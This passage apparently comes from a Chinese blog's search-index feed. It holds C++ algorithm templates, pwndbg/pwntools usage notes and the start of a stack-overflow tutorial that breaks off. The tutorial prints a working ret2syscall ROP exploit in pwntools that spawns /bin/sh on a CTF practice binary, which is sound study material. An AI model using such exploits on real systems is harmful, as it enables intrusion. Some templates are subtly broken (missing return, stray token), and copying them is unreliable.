C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="高精度乘以低精度"><a href="#高精度乘以低精度" class="headerlink" title="高精度乘以低精度"></a>高精度乘以低精度</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C = A * b, A &gt;= 0, b &gt;= 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">mul</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>() || t; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; A.<span class="built_in">size</span>()) t += A[i] * b;</span><br><span class="line">        C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">        t /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="高精度除以低精度"><a href="#高精度除以低精度" class="headerlink" title="高精度除以低精度"></a>高精度除以低精度</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A / b = C ... r, A &gt;= 0, b &gt; 0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">div</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, <span class="type">int</span> b, <span class="type">int</span> &amp;r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">    r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -- )</span><br><span class="line">    &#123;</span><br><span class="line">        r = r * <span class="number">10</span> + A[i];</span><br><span class="line">        C.<span class="built_in">push_back</span>(r / b);</span><br><span class="line">        r %= b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(C.<span class="built_in">begin</span>(), C.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();</span><br><span class="line">    r</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="前缀和"><a href="#前缀和" class="headerlink" title="前缀和"></a>前缀和</h2><p>一维</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">S[i] = a[<span class="number">1</span>] + a[<span class="number">2</span>] + ... a[i]</span><br><span class="line">a[l] + ... + a[r] = S[r] - S[l - <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>二维</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S[i, j] = 第i行j列格子左上部分所有元素的和</span><br><span class="line">以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为：</span><br><span class="line">S[x2, y2] - S[x1 - <span class="number">1</span>, y2] - S[x2, y1 - <span class="number">1</span>] + S[x1 - <span class="number">1</span>, y1 - <span class="number">1</span>]</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="差分"><a href="#差分" class="headerlink" title="差分"></a>差分</h2><p>一维</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给区间[l, r]中的每个数加上c：B[l] += c, B[r + <span class="number">1</span>] -= c</span><br></pre></td></tr></table></figure><p>二维</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c：</span><br><span class="line">S[x1, y1] += c, S[x2 + <span class="number">1</span>, y1] -= c, S[x1, y2 + <span class="number">1</span>] -= c, S[x2 + <span class="number">1</span>, y2 + <span class="number">1</span>] += c</span><br></pre></td></tr></table></figure><p>![</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>](<a href="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207081703562.png">https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207081703562.png</a>)</p><p>b[x1][ y1 ] +&#x3D;c ; 对应图1 ,让整个a数组中蓝色矩形面积的元素都加上了c。<br>b[x1,][y2+1]-&#x3D;c ; 对应图2 ,让整个a数组中绿色矩形面积的元素再减去c，使其内元素不发生改变。<br>b[x2+1][y1]- &#x3D;c ; 对应图3 ,让整个a数组中紫色矩形面积的元素再减去c，使其内元素不发生改变。<br>b[x2+1][y2+1]+&#x3D;c; 对应图4,,让整个a数组中红色矩形面积的元素再加上c，红色内的相当于被减了两次，再加上一次c，才能使其恢复。</p></div><div class="story post-story"><h2 id="双指针算法"><a href="#双指针算法" class="headerlink" title="双指针算法"></a>双指针算法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (j &lt; i &amp;&amp; <span class="built_in">check</span>(i, j)) j ++ ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 具体问题的逻辑</span></span><br><span class="line">&#125;</span><br><span class="line">常见问题分类：</span><br><span class="line">    (<span class="number">1</span>) 对于一个序列，用两个指针维护一段区间</span><br><span class="line">    (<span class="number">2</span>) 对于两个序列，维护某种次序，比如归并排序中合并两个有序序列的操作</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="离散化"><a href="#离散化" class="headerlink" title="离散化"></a>离散化</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; alls; <span class="comment">// 存储所有待离散化的值</span></span><br><span class="line"><span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()); <span class="comment">// 将所有值排序</span></span><br><span class="line">alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>()), alls.<span class="built_in">end</span>());   <span class="comment">// 去掉重复元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二分求出x对应的离散化的值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> <span class="comment">// 找到第一个大于等于x的位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = alls.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (alls[mid] &gt;= x) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r + <span class="number">1</span>; <span class="comment">// 映射到1, 2, ...n</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>假定有一个无限长的数轴，数轴上每个坐标上的数都是 00。</p><p>现在，我们首先进行 nn 次操作，每次操作将某一位置 xx 上的数加 cc。</p><p>接下来，进行 mm 次询问，每个询问包含两个整数 ll 和 rr，你需要求出在区间 [l,r][l,r] 之间的所有数的和。</p><h4 id="输入格式-2"><a href="#输入格式-2" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行包含两个整数 nn 和 mm。</p><p>接下来 nn 行，每行包含两个整数 xx 和 cc。</p><p>再接下来 mm 行，每行包含两个整数 ll 和 rr。</p><h4 id="输出格式-2"><a href="#输出格式-2" class="headerlink" title="输出格式"></a>输出格式</h4><p>共 mm 行，每行输出一个询问中所求的区间内数字和。</p><h4 id="数据范围-2"><a href="#数据范围-2" class="headerlink" title="数据范围"></a>数据范围</h4><p>−109≤x≤109−109≤x≤109,<br>1≤n,m≤1051≤n,m≤105,<br>−109≤l≤r≤109−109≤l≤r≤109,<br>−10000≤c≤10000−10000≤c≤10000</p><h4 id="输入样例：-2"><a href="#输入样例：-2" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">3 3</span><br><span class="line">1 2</span><br><span class="line">3 6</span><br><span class="line">7 5</span><br><span class="line">1 3</span><br><span class="line">4 6</span><br><span class="line">7 8</span><br></pre></td></tr></table></figure><h4 id="输出样例：-2"><a href="#输出样例：-2" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">0</span><br><span class="line">5</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">300010</span>;</span><br><span class="line"><span class="type">int</span> a[N], s[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; alls;</span><br><span class="line">vector&lt;PII&gt; add, query;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = alls.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(alls[mid] &gt;= x) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt;:: <span class="function">iterator <span class="title">unique</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; a.<span class="built_in">size</span>(); i ++)</span><br><span class="line">        <span class="keyword">if</span>(!i || a[i] != a[i - <span class="number">1</span>])</span><br><span class="line">            a[j ++ ] = a[i];</span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">begin</span>() + j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x, c;</span><br><span class="line">        cin &gt;&gt; x &gt;&gt; c;</span><br><span class="line">        add.<span class="built_in">push_back</span>(&#123;x, c&#125;);</span><br><span class="line"></span><br><span class="line">        alls.<span class="built_in">push_back</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> l, r;</span><br><span class="line">        cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">        query.<span class="built_in">push_back</span>(&#123;l, r&#125;);</span><br><span class="line"></span><br><span class="line">        alls.<span class="built_in">push_back</span>(l);</span><br><span class="line">        alls.<span class="built_in">push_back</span>(r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(alls.<span class="built_in">begin</span>(), alls.<span class="built_in">end</span>());</span><br><span class="line">    alls.<span class="built_in">erase</span>(<span class="built_in">unique</span>(alls), alls.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> item : add)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x = <span class="built_in">find</span>(item.first);</span><br><span class="line">        a[x] += item.second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= alls.<span class="built_in">size</span>(); i ++ ) s[i] = s[i - <span class="number">1</span>] + a[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> item : query)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> l = <span class="built_in">find</span>(item.first), r = <span class="built_in">find</span>(item.second);</span><br><span class="line">        cout &lt;&lt; s[r] - s[l - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="区间合并"><a href="#区间合并" class="headerlink" title="区间合并"></a>区间合并</h2><p>1）把要合并的区间按区间左端点从小到大排序<br>2）用st和ed指针从前往后维护区间<br>3）比较ed 和后一个区间的左端点，分情况更新ed和first</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将所有存在交集的区间合并</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;PII&gt; &amp;segs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;PII&gt; res;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(segs.<span class="built_in">begin</span>(), segs.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> st = <span class="number">-2e9</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> seg : segs) <span class="comment">//定义了一个自动类型变量seg, seg的取值从segs[0]开始到segs末尾，也就是遍历了segs</span></span><br><span class="line">        <span class="keyword">if</span> (ed &lt; seg.first)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);</span><br><span class="line">            st = seg.first, ed = seg.second;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> ed = <span class="built_in">max</span>(ed, seg.second);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (st != <span class="number">-2e9</span>) res.<span class="built_in">push_back</span>(&#123;st, ed&#125;);</span><br><span class="line"></span><br><span class="line">    segs = res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwndbg/pwntools</title>
      <link href="/2022/07/06/pwn%E5%85%A5%E9%97%A8/"/>
      <url>/2022/07/06/pwn%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="pwndbg-x2F-gdb的使用"><a href="#pwndbg-x2F-gdb的使用" class="headerlink" title="pwndbg&#x2F;gdb的使用"></a>pwndbg&#x2F;gdb的使用</h1><div class="story post-story"><h2 id="X的使用"><a href="#X的使用" class="headerlink" title="X的使用"></a>X的使用</h2><p>x 是 examine 的缩写</p><p>n 表示要显示的内存单元的个数</p><p>u 表示一个地址单元的长度：</p><p>b 表示单字节<br>h 表示双字节<br>w 表示四字节<br>g 表示八字节<br>f 表示显示方式，可取如下值：</p><p>x 按十六进制格式显示变量<br>d 按十进制格式显示变量<br>u 按十进制格式显示无符号整型<br>o 按八进制格式显示变量<br>t 按二进制格式显示变量<br>a 按十六进制格式显示变量<br>i 指令地址格式<br>c 按字符格式显示变量<br>f 按浮点数格式显示变量<br>举例<br>x &#x2F;20gx buf: 表示从内存地址 buf 读取内容，g 表示八字节，20 表示 20 个单位，x 按十六进制格式显示变量</p><p>x &#x2F;3hu buf：表示从内存地址 buf 读取内容，h 表示以双字节为一个单位，3 表示三个单位，u 表示十进制格式显示无符号整型</p></div><div class="story post-story"><h2 id="P的使用"><a href="#P的使用" class="headerlink" title="P的使用"></a>P的使用</h2><p>打印指令p(print)：<br>p fun_name &#x2F;&#x2F;打印fun_name的地址，需要保留符号<br>p 0x10-0x08 &#x2F;&#x2F;计算0x10-0x08的结果<br>p &amp;a &#x2F;&#x2F;查看变量a的地址<br>p *(0x123456) &#x2F;&#x2F;查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号<br>p $rdi &#x2F;&#x2F;显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值<br>p *($rdi) &#x2F;&#x2F;显示rdi指向的值</p></div><div class="story post-story"><h2 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h2><p>cyclic n ：生成长度为n的字符串</p><p>cyclic -l aaaa #查找偏移（一般是返回地址</p><p>假如说我想找aaaj这个字符串的偏移，我们可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic_find(&#x27;aaaj&#x27;)</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>info all-registers 查看所有的寄存器的值</p><h1 id="pwntools的使用"><a href="#pwntools的使用" class="headerlink" title="pwntools的使用"></a>pwntools的使用</h1><h3 id="p32-p64"><a href="#p32-p64" class="headerlink" title="p32 p64"></a>p32 p64</h3><p>就是将一个数字转换为字符，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(0xdeadbeef)</span><br></pre></td></tr></table></figure><p>就会转换为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;\xef\xbe\xad\xde&#x27;</span><br></pre></td></tr></table></figure><p>这里顺序反了是因为linux编译的程序是小端序的</p><h3 id="u32-u64"><a href="#u32-u64" class="headerlink" title="u32 u64"></a>u32 u64</h3><p>就是将字符转换为数字，</p></div>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<div class="story post-story"><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><strong>Linux 的系统调用通过 int 80h 实现</strong>，用系统调用号来区分入口函数</p><p><strong>应用程序调用系统调用的过程是：</strong></p><p>1、把<strong>系统调用的编号存入 EAX</strong></p><p>2、把<strong>函数参数存入其它通用寄存器</strong></p><p>3、<strong>触发 0x80 号中断</strong>（int 0x80）</p><p>在32位下：</p><p>1.将EAX寄存器的值设置为OXb:EAX &#x3D; OXb</p><p>3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; 0</p><p>3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; o</p><p>64位下：</p><p>1.将RAX寄存器的值设置为0×3b:RAX &#x3D; OX3b</p><p>2.将RDI寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:RDI &#x3D; &amp;(“ &#x2F;bin&#x2F;sh”)</p><p>3.将RSI和RDX寄存器的值都设为0: RSI &#x3D; RDX &#x3D; o</p><p>只需要让栈顶的值 然后可以通过 pop eax 达到目的</p><h3 id="例（CTFwiki）："><a href="#例（CTFwiki）：" class="headerlink" title="例（CTFwiki）："></a>例（CTFwiki）：</h3><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207061947158.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207061947158.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>计算偏移</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062014856.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062014856.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>运用ropper 查找int  0x80系统调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f ret2syscall --search &quot;int 0x80&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207061952140.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207061952140.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>运用ropper 查找其他寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f ret2syscall --search &quot;pop|ret&quot;| grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062002154.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062002154.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>其他类推</p><p>在IDA找到bin&#x2F;sh的地址</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx_ret = <span class="number">0x0806eb91</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806eb6a</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh_addr = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you plan to do?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span> + p32(pop_eax_ret) </span><br><span class="line">payload += p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx_ret) </span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) </span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207062031854.png" class="lazyload" 